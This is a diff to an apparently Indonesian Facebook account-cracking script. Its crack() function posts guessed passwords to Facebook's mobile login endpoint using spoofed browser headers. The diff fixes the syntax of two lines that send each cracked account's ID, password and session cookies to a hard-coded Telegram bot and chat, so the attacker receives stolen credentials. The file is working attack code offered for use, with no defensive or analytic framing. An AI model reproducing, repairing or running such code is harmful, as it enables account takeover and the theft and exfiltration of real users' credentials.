@@ -520,7 +520,7 @@ def crack(idf,pwv):
 			heade={"Host": "m.facebook.com","connection": "keep-alive","cache-control": "max-age=0","save-data": "on","origin": "https://m.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "XMLHttpRequest","dnt": "1","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-platform": '"Android"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","referer": "https://m.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100","accept-encoding": "gzip, deflate br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}
+				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}")
 				cetak(panel(f"[bold yellow]{idf}|{pw}\n[bold red]{ua}",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI CP {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				#tree = Tree(f"RESULTS CP {tgl} {bln} {thn}")
 				#tree.add(f"[bold yellow]{idf}|{pw}")
@@ -534,7 +534,7 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}\n{kuki}
+				requests.post(f"https://api.telegram.org/bot5442935736:AAHjdbHR1eokgcUhA8DnYYQqBxp4nXLKafM/sendMessage?chat_id=-1001808963086&text={idf}\n{pw}\n{kuki}")
 				cetak(panel(f"[bold green]{idf}|{pw}\n[bold green]{kuki}[/]",width=70,title=f"[bold green]• [bold yellow]• [bold red]• [bold cyan]PIXI OK {tgl} {bln} {thn} [bold red]• [yellow]• [bold green]•",style=f"{color_table}"))
 				#tree = Tree(f"RESULTS OK {tgl} {bln} {thn}")
 				#tree.add(f"[bold green]{idf}|{pw}")
